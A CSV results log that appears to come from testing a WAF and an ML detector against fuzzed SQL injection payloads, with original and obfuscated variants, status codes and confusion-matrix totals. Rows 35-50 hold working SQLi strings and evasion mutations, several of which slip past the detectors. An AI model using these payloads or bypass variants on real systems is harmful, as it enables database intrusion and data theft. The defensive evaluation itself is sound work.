Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
35,2024-12-16T18:46:49.842254,"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",403,403,403,both_correct,"1,  (  SElECT   (  cAse WHEn   (  3717  = 
3717  )   THen 0x1 ELse  OR 0*  (  sELEcT 'dI' liKE 'dI' FRom master..sysdatabases /**/)   eNd   )    )   ",2024-12-16T18:46:55.992871,403,200,waf_correct_ml_incorrect,"1,  (  SElect   (  caSe when   (  3717  = 	 and 2425 LIKE 2425  )   thEN 0x1/**/eLse  or 0x0*  (  SElEcT 'dI' lIKE 'dI' fRom master..sysdatabases /*+g}H[*/)   END   )    )   ",2024-12-16T18:47:04.072296,403,200,waf_correct_ml_incorrect,"(SeLECt 1),  (  SELECt   (  CaSE WHEn   (  '4)_i%'<>'4)_i%#'   lIKe    anD 2425 lIKE 0x979  )   ThEN 0x1/*wI[*/ElSE  oR 0x0*  (  sELEct 'dI' LIke 'dI' frOM master..sysdatabases  )   END   )    )   ",2024-12-16T18:47:13.142485,403,200,waf_correct_ml_incorrect,"(SelEct (SelecT 1)),/**/ (  sEleCt   (  caSe WhEn   (  ' AND 1)_i%' not like ''[h'='[h')_i%#'   lIKE    AnD 2425 LiKe 0x979  )   thEN 0x1/*t	*/elSE  Or 0x0*  (  SelECT 'dI' likE 'dI' FROm master..sysdatabases  )   eNd   )    )   ",2024-12-16T18:47:23.315953,403,200,waf_correct_ml_incorrect,"(sElEcT
(selecT 1)),/**/ (  SeLECT   (  cASE wHen/**/  (  ' AND (SELECT 0x1))_i%' not like ''[h'='[h')_i%#'   liKE    anD 892 not like 893 liKe 0x979  )   Then 0x1/**/eLsE  oR 0x0*  (  select 'dI' LiKE 'dI' fRom master..sysdatabases  )   ENd   )    )   4S",2024-12-16T18:47:35.183560,403,200,waf_correct_ml_incorrect
36,2024-12-16T18:47:48.024608,undus de lerda,200,200,200,both_correct,"undus/**/de
lerda",2024-12-16T18:47:48.805456,200,200,both_correct,undus de	lerda,2024-12-16T18:47:50.693557,200,200,both_correct,"undus/*~/a{p*/de
lerda",2024-12-16T18:47:52.489681,200,200,both_correct,undus/*~/a{p*/de	lerda,2024-12-16T18:47:54.823571,200,200,both_correct,"undus/*~/a{p*/de
lerda",2024-12-16T18:47:57.046259,200,200,both_correct
37,2024-12-16T18:47:59.243047,[email],200,200,200,both_correct,[email],2024-12-16T18:48:00.245350,200,200,both_correct,[email],2024-12-16T18:48:02.208278,200,200,both_correct,[email],2024-12-16T18:48:04.220907,200,200,both_correct,[email],2024-12-16T18:48:06.191904,200,200,both_correct,[email],2024-12-16T18:48:08.174400,200,200,both_correct
38,2024-12-16T18:48:10.126793,"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""  )   As xylo WheRE 2112   lIKe   (SelEct 1) AND 3715 IN    (    (   char  (  113  )  +char  (/**/ 113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SelecT   (  caSE WheN   (  3715  =  3715  )   THEn char  (  0x9b1 NOT LIKE 2482  )   elSE char  (  48  )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )
    )  --",2024-12-16T18:48:27.349812,403,200,waf_correct_ml_incorrect,"1""  )   aS xylo wHErE 2112   liKE   (seLeCt 1) AnD 3715 In    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  389 NOT LIKE 390  )  +char  (  113  )  +  (  SELECt
  (  Case when   (  3715   like   (SELECT 3715)  )   ThEn char  (  0x9b1 NOT LIKE  AND 1  )   ELse char  (  48  )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )
    )  --",2024-12-16T18:48:46.874296,403,200,waf_correct_ml_incorrect,"1""  )   as xylo WHERE 2112   lIke   (sELECT 1) ANd 2914<>2915 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  0x185 NOT LIKE 390  )  +char  (  (SelEct 1)  )  +  (  SElect
  (  CAsE WhEn   (  3715   LIkE   (seLeCt 3715)  )   tHEN char  (/**/ 0x9b1 NOT LIKE  And 1  )   ELSE char  (  48  )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:49:07.841231,403,200,waf_correct_ml_incorrect,"1""  )   as xylo wHEre 2112   LIKE   (sEleCT 1) ANd 2914<>2915 IN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  0x185 NOT LIKE 390  )  +char  (  (SELecT 1)  )  +  (  SeLECT
  (  CaSe WheN   (  3715   LIKE   (sElecT 3715)  )   then char  (  0x9b1 not like  ANd 1  )   ElSE char  (	 48  )   END   )    )   +char  (  0x1930=6448  )  +char  (  122  )  +char  (   Or 0  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:49:29.763565,403,200,waf_correct_ml_incorrect,"1""  )   aS xylo wHere 2112   LIkE   (selEct  anD 1) AND 2914<>2915 in    (    (   char  (  113  )  +char  (  113/**/ )	 +char  (  112  )  +char  (  0x185 not like 390  )  +char  (  (SeLeCT 1)  )  +  (  sELeCT
  (  CasE WheN   (  3715   LIKe   (sELect 3715)  )   then char  (  0x9b1 not like  ANd 1  )   ELsE char  (	 0x30  )   enD   )    )   +char  (  0x1930=6448  )  +char  (  122  )  +char  (   OR 0  )  +char  (  122  )  +char  (  9487 LIKe 9487   )    )     )  --",2024-12-16T18:49:51.806116,403,200,waf_correct_ml_incorrect
39,2024-12-16T18:50:14.743146,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",403,403,403,both_correct,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat /**/(  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *8550 NOT LIKE 8551   )    )   x from information_schema.character_sets group by x 
)  a  )   and   (  ""rwlq""  =  ""rwlq",2024-12-16T18:50:28.255525,403,403,both_correct,"1""  )   or   (  select  OR 0 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *8550 NOT LIKE 9385=9385   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",2024-12-16T18:50:43.691249,403,403,both_correct,"(SELECT 1)""  )   or   (  select  OR 0 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )  /*Pmr}g*/ )     )  ,0x717a767a71,floor  (  rand  (  'MR'!='MR^'  )  *(SELECT 8550) NOT LIKE 9385=9385   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq"" 
=  ""rwlq",2024-12-16T18:50:59.618618,403,403,both_correct,"(sELeCt  AnD 1)""  )   or   (  select  OR 103 NOT LIKE (SELECT 104) from  (  select count  (  *  )  ,concat /**/(  0x7171706a71,  (  select   (  elt  (  9173  =  (SELECT 0x1),0x1   )  /*V""*/ )     )  ,0x717a767a71,floor  (  rand  (  'MR' not like 'MR^'  )  *(sELECt 8550) NOT LIKE 9385=9385   )    )   x frOm information_schema.character_sets group by x  )  a  )   aND   (  ""rwlq""  =  ""rwlq",2024-12-16T18:51:17.245406,403,403,both_correct,"(SelECt  AND 1)""  )   or   (  select  OR 103 NOT LIKE (SELECT 104) from  (  select count  (  *  )  ,concat /*maA4*/(  0x7171706a71,  (  select   (  elt  (  0x23d5  =  (SELECT 0x1),0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  'MR' not like 'MR^'  )  *(sELECt 8550) NOT LIKE	24!=(SELECT 1)=9385   )    )   x frOm information_schema.character_sets group by x  )  a  )   aND   (  ""rwlq""  =  ""rwlq",2024-12-16T18:51:36.696948,403,403,both_correct
40,2024-12-16T18:51:56.329032,escocia 197,200,200,200,both_correct,"escocia
'P3B' not like/**/'P3BI'",2024-12-16T18:51:56.967588,200,200,both_correct,"escocia
'P3B'/**/not	like/*(;Kq-*/'P3BI'",2024-12-16T18:51:59.575049,200,200,both_correct,escocia 'P3B' not	like/*(;Kq-*/'P3BI',2024-12-16T18:52:02.868788,200,200,both_correct,"escocia
'P3B'/**/not	like/*(;Kq-*/'P3BI'",2024-12-16T18:52:05.806802,200,200,both_correct,"escocia
'P3B'
not	like/*(;Kq-*/'P3BI'",2024-12-16T18:52:08.765013,200,200,both_correct
41,2024-12-16T18:52:11.563231,1   )    )    as xmac where 7692  =  7692,403,403,200,waf_correct_ml_incorrect,'L'!='LY'  /**/)    )    As xmac wHerE 0x1e0c   liKE   	oR 0,2024-12-16T18:52:13.567024,403,200,waf_correct_ml_incorrect,"'L' not like 'LY'  /*|*/)    )    as xmac whEre 0x1e0c /**/ LIKE   
OR (SELECT  AND 1) LIKE 5058",2024-12-16T18:52:17.440194,403,403,both_correct,"'L' not like 'LY'  /*|*/)    )    AS xmac where 0x1e0c	/**/ Like/**/  
oR (seLEcT  anD  OR 3550!=3551) liKe 0x13c2",2024-12-16T18:52:23.073538,403,200,waf_correct_ml_incorrect,"'L' not like 'LY'  /*|*/)/**/   )    aS xmac wherE 0x1e0c /**/ lIke/**/  
oR (SelEct  ANd  or (SELECT 'Tt'='Tt') not like  AND 1) LIke 0x13c2",2024-12-16T18:52:29.497128,403,403,both_correct,"'L' not like 'LY'  /*|*/)/**/   )   
As xmac WHerE 0x1e0c   LIkE/**/  
Or (SEleCT  AnD  oR (SElEcT 'Tt'='Tt') not like  &&  and 'by'='by') likE 0x13c2",2024-12-16T18:52:37.367865,403,200,waf_correct_ml_incorrect
42,2024-12-16T18:52:45.274904,lue39,200,200,200,both_correct,lue39,2024-12-16T18:52:45.644406,200,200,both_correct,lue39,2024-12-16T18:52:47.000998,200,200,both_correct,lue39,2024-12-16T18:52:48.377923,200,200,both_correct,lue39,2024-12-16T18:52:49.745312,200,200,both_correct,lue39,2024-12-16T18:52:51.128412,200,200,both_correct
43,2024-12-16T18:52:52.493352,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"0x1   )    )    	)   aNd  oR 'c' NOT LIKE 'ct'   like     (  SelECT count /**/(  *  )   FROM domain.domains AS t1,domain.columns aS t2,domain.tables aS t3  )  --",2024-12-16T18:52:58.807851,200,200,both_incorrect,"0x1   )    )    	)   aNd  Or 'c' not like 'ct'	  liKE     (  seLECt count  (  *  )   frOM domain.domains as t1,domain.columns As t2,domain.tables as t3  )  --",2024-12-16T18:53:07.712086,200,200,both_incorrect,"0x1   )    )    	)  /**/ANd  Or 'c' not like 'ct'	  liKE    	(  sElECt count  (  *  )   fRom domain.domains as t1,domain.columns As t2,domain.tables AS t3  )  --",2024-12-16T18:53:16.186800,200,200,both_incorrect,"0x1   )    )    	)  /**/and  Or 'c' not like 'ct'
  lIKE    	(  sELEct count/*\'Ue*/ (  *  )   FROm domain.domains aS t1,domain.columns as t2,domain.tables aS t3  )  --",2024-12-16T18:53:24.805162,200,200,both_incorrect,"0x1   )    )    	)  /*-o*/aND  oR 'c' not like 'ct'	  lIke    	(  SElect count/**/ (  *  )   FROm domain.domains aS t1,domain.columns AS t2,domain.tables/**/as t3  )  --",2024-12-16T18:53:34.009483,200,200,both_incorrect
44,2024-12-16T18:53:42.962724,pineda de la sierra,200,200,200,both_correct,pineda	de/*q5T*/la sierra,2024-12-16T18:53:44.028608,200,200,both_correct,pineda de/**/la/*2AJ*/sierra,2024-12-16T18:53:46.392399,200,200,both_correct,pineda	de/**/la sierra,2024-12-16T18:53:48.842238,200,200,both_correct,"pineda
de/**/la/*r*/sierra",2024-12-16T18:53:51.023978,200,200,both_correct,pineda de la/**/sierra,2024-12-16T18:53:53.325593,200,200,both_correct
45,2024-12-16T18:53:55.457479,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,403,403,403,both_correct,"1'  )  
where (SELECT 3767)  =  3767 and 6240  =    (  'qqpjq'||  (  select case  OR 0 when 'C'!='CA' then 1 else 0 end from rdb$database  )  ||'qzvzq'/*ikdv*/ )  --",2024-12-16T18:54:02.409819,403,403,both_correct,"'>X'!='>XY''  )  
where (SELECT 3767)  =  3767 and (SELECT 1)  =    (  'qqpjq'||  (  select case/**/ OR (SELECT 0) when 'C'!='CA' then 1 else 0 end from rdb$database  )  ||'qzvzq'/**/ )
 --",2024-12-16T18:54:11.182638,403,403,both_correct,"'>X'<>'>XY''  )  	where (SELECT (SELECT 1))  =  3767 and (SELECT 1)  =    (  'qqpjq'||  (  select case/**/ OR (SELECT 0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT 0) end from rdb$database  )  ||'qzvzq'  )
 --",2024-12-16T18:54:21.098496,403,403,both_correct,"'>X' NOT LIKE '>XY''  )  
where (SELECT (SELECT 1))  =  (SELECT 1) and (SELECT 'I'<>'IO')  =    (  'qqpjq'||  (  select case  OR (SELECT 0x0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT 0) end from rdb$database  )  ||'qzvzq'  )
 --",2024-12-16T18:54:32.588050,403,403,both_correct,"'>X' not like '>XY''  )  	where (SELECT (SELECT (SELECT 1)))  =  (SELECT 0x1) and (SELECT 'I'<>'IO')  =    (  'qqpjq'||  (  select case  OR (SELECT 0x0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT '['='[') end from rdb$database  )  ||'qzvzq' /**/)
 --",2024-12-16T18:54:44.804265,403,403,both_correct
46,2024-12-16T18:54:58.282453,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",403,403,403,both_correct,"-0x2017%""  ) /**/ union	all SeLECt 3877,(SElect 1),'%' NOT LIKE '%2',3877,3877,3877--",2024-12-16T18:55:01.204243,403,403,both_correct,"-0x2017%""  ) /*8*/ union all SElECT 3877,(sELECT '^0'/**/not like '^0Z'),'%' NOT LIKE '%(SELECT 2)',3877, or 0,3877--",2024-12-16T18:55:06.288691,403,403,both_correct,"-0x2017%""  ) /*(SELECT 8)*/ union all selEct 3877,(SelEct	'^0'/**/not like '^0Z'),'%' NOT LIKE '%(SELECT/**/'/)""'<>'/)""6')',3877, Or 0,(SELECT 1)--",2024-12-16T18:55:13.059276,403,403,both_correct,"-0x2017%""  ) /*(SELECT (SELECT 8))*/ union all selEct 9206 NOT LIKE 9207,(SelEct
'^0' not like '^0Z'),'%' NOT LIKE '%(SELECT/*Rtm@=*/'/)""'<>'/)""6')',3877, Or  aNd 1,(SelecT 1)--",2024-12-16T18:55:21.053714,403,403,both_correct,"-0x2017%""  ) /*(SELECT (SELECT 8))*/ union all selEct 9206 NOT LIKE '=FFc'='=FFc',(SelEct '^0' not like '^0Z'),'%' NOT LIKE '%(SELECT/*Rtm@=*/'/)""'<>'/)""6')', And (SELECT 1), or  anD/**/1,(select 1)--",2024-12-16T18:55:30.374926,403,403,both_correct
47,2024-12-16T18:55:40.954056,"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg wHeRe 4580   lIke   2082!=2083 AND 4241  =  convert  (  int,  (  SeLect char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  ( /**/ Or 0  )  +char  (  113  )  +  (  seLeCt   (  CAsE WHEN   (  4241 	=  4241  )   thEN char  (  49  )   eLSe char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:55:58.631347,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg wheRE 4580   lIKE   0x822!=2083 AnD 4241  =  convert  (  int,  (  SeLect char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )  +char  (  113  )  +  (  SeLEcT   (  CAse WHEn   (  4241  =  4241  )   theN char  (  49  )   eLse char  (  48  )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SELECT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  113   )    )     )  --",2024-12-16T18:56:18.503013,403,200,waf_correct_ml_incorrect,"1""  )   AS nixg WHEre 4580   LIke   0x822!=2083 anD 4241  =  convert  (  int,  (  seleCt char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )  +char  (  113  )  +  (  seLECT   (  CAse WheN   (   OR 0<>5371   Like   4241  )   THEN char  (  49  )   ElSE char  (  48	 )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  (sElECt 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71/**/  )    )     )  --",2024-12-16T18:56:38.880753,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg WheRE 4580   liKE   0x822 NOT LIKE 2083 anD 4241  =  convert  (  int,  (  sELEct char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )	 +char  (  '_'<>'_w'  )  +  (  SeLEct   (  CAse wHeN   (   Or  AND 1<>0x14fb   likE   4241  )   ThEN char  (  49  )   else char  (  48	 )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SeLecT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71   )    )     )  --",2024-12-16T18:57:00.029773,403,200,waf_correct_ml_incorrect,"0x1""  )   as nixg wHeRe 4580  
LIkE   0x822 NOT LIKE 2083 aNd  OR 0  =  convert  (  int,  (  SElECt char  (  0x71  )  +char /**/(  113  )  +char  (  112  )  +char  (   OR 0  )	 +char  (  '_'<>'_w'  )  +  (  SeLEct   (  caSE When   (   oR  anD '	' NOT LIKE '	l'<>0x14fb   lIkE   4241  )   tHEN char  (  49  )   elSE char  (  48	 )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SElEcT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71   )    )     )  --",2024-12-16T18:57:21.899727,403,200,waf_correct_ml_incorrect
48,2024-12-16T18:57:44.966989,56,200,200,200,both_correct,'T' not like 'T(',2024-12-16T18:57:45.207504,200,403,waf_correct_ml_incorrect,"'T'
not like/**/'T('",2024-12-16T18:57:47.101887,200,200,both_correct,'T' not/**/like/**/'T(',2024-12-16T18:57:49.165490,200,200,both_correct,'T'/*y<*/not/**/lIKE/**/'T(',2024-12-16T18:57:51.354784,200,200,both_correct,'T'/*y<*/not	liKE/**/'T(',2024-12-16T18:57:53.762504,200,200,both_correct
49,2024-12-16T18:57:56.037595,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",403,403,403,both_correct,"-5202 union all SELeCt/**/5332,5332,5332,
AnD 1=8146,0x14d4,5332,5332#R",2024-12-16T18:57:58.877322,403,403,both_correct,"-5202 union all seLeCT 5332,5332, OR 0, AnD (SELECT 1)=8146,0x14d4,'51' NOT LIKE '51u',5332#RU",2024-12-16T18:58:03.273806,403,403,both_correct,"- And (SELECT 1) union all sElEcT 5332,'<'<>'<3', oR 0, aND/**/(SeleCT 1)=8146,0x14d4,'51' not
like '51u',5332#RU",2024-12-16T18:58:09.043260,403,403,both_correct,"- aNd (sEleCt  OR 0) union all SElEct 5332,'<' not like '<'8E]Y'!='8E]Y9'',/*]A*/oR 0, AnD/**/(SELECT 1)=8146,0x14d4,'51' not like '51u',0x14d4#RU",2024-12-16T18:58:15.560774,403,403,both_correct,"- and (SeLEct  OR (SELECT 0)) union all SelEcT  and 1,'<' not like '<'8E]Y'!='8E]Y9'', Or	0, And/*-AD,d*/(selECT 1)='.s=V'='.s=V',0x14d4,'51' not like '51u',0x14d4#RU",2024-12-16T18:58:23.528158,403,403,both_correct
50,2024-12-16T18:58:32.380945,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",403,403,200,waf_correct_ml_incorrect,"-8791""   )    )     )   or make_set  (  3173 IN (3172,3173,3174)  =  6620, AND (SELECT 1)  )   and /**/ 	(    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:58:37.476014,403,403,both_correct,"- or 0""   )    )     )   or make_set  (  3173 IN ((SELECT 3172),3173,3174)  =  1247!=1248, AND (SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:58:44.883223,403,403,both_correct,"- OR 0""   )    )     ) 	 or make_set  (  3173 IN ((SELECT 3172),3173, AND 1)  =  'l'!='l_'!=(SELECT 1248), AND (SELECT 1)  )   and    (    (     (/**/ ""pvdk""  =  ""pvdk",2024-12-16T18:58:52.958698,403,403,both_correct,"- or 3053 In (3052,3053,3054)""   )    )     ) 	 or make_set  (  (SELECT 3173) IN ((SELECT  AND 1),3173, AND 1)  =  'l'!='l_'!=(SELECT 1248), AND	(SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:59:02.136055,403,403,both_correct,"- or 3053 IN (3052,3053,(seLEct  AND 1))""   )    )     ) 	 or make_set  (  (SELECT 3173) IN ((SELECT  AND 1),3173, AND 1) /**/=  'l'!='l_'!=(SELECT 'ct' NOT LIKE 'ct*'), AND
(SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:59:12.436965,403,403,both_correct

Overall Results
WAF TP,165
WAF TN,103
WAF FP,5
WAF FN,27
ML TP,113
ML TN,103
ML FP,5
ML FN,79

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,201,15
ML Incorrect,67,17
